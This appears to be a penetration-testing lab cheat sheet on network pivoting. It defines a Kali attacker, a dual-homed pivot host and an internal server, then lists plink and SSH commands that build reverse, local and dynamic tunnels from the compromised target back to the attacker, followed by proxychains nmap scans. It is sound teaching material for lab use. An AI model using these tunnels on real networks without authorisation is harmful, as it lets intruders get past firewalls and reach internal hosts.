
The Attacking Box (Kali Linux)
IP: 192.168.1.16
Netmask: 255.255.255.0
Gateway: 192.168.1.1

The pivot host (Windows XP) or linux
Dual-Homed – Configure 2 Network Cards in VirtualBox!
user: lowuser
FIRST IP: 192.168.1.30
Netmask: 255.255.255.0
SECOND IP: 10.0.0.2
Netmask: 255.0.0.0

Web server (IIS, Apache – Windows or Linux, whatever u like) -> I use a Windows 2012 server
IP: 10.0.0.10
Netmask: 255.0.0.0

# Port Forwarding


### Remote Forwarding

To get to server at 10.0.0.10

From Target   
`plink 192.168.1.16 -P 22 -C -R 127.0.0.1:4444:10.0.0.10:80`   
`ssh -p 22  -R 127.0.0.1:4444:10.0.0.10:80 root@192.168.1.16`

From Kali   
`curl 127.0.0.1:4444`

### Local Forwarding

Firewall rule blocking 3389

From Target   
`plink 192.168.1.16 -P 22 -C -L 192.168.1.30:3390:192.168.1.30:3389`   
`ssh -p 22 -L 192.168.1.30:3390:192.168.1.30:3389 root@192.168.1.16`

From Kali   
`rdesktop 192.168.1.30:3390`

### dynamic forwarding

From target    
`plink 192.168.1.16 -P 22 -C -R 127.0.0.1:2222:22`    
`ssh -f -N -R 2222:127.0.0.1:22 root@192.168.1.16`

From Kali   
`ssh -f -N -D 127.0.0.1:8080 -p 2222 lowuser@127.0.0.1`

`vi /etc/proxychains.conf`   
`socks4   127.0.0.1   8080`

`proxychains nmap -sT -Pn <IP>`
